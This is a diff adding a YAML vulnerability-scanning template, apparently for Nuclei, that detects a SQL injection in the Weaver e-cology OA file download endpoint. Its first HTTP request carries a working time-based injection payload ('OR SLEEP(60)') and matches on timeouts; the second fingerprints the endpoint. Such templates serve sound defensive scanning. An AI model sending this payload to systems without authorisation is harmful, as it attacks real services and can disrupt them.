@@ -1,0 +1,47 @@
+id: go-poc-weaver-e-cology-oa-sql-injection
+info:
+  name: Weaver e-cology OA SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for SQL injection vulnerabilities in the Weaver e-cology OA system's file download functionality.
+    It simulates time-delay SQL injection payloads and monitors for server timeout responses.
+
+variables:
+  random_number: '{{rand_text_numeric(5)}}'
+
+http:
+  - raw:
+      - |
+        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileid={{random_number}}%20OR%20SLEEP(60)&isFromOutImg=1
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 504 || status_code == 502'
+      - type: dsl
+        dsl:
+          - 'response_time > 60'
+  - raw:
+      - |
+        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileid={{random_number}}&isFromOutImg=1
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "HtmlLabelInfo"
+      - type: regex
+        regex:
+          - "HtmlLabelIndex"
+      - type: word
+        words:
+          - "HtmlLabelInfo c"
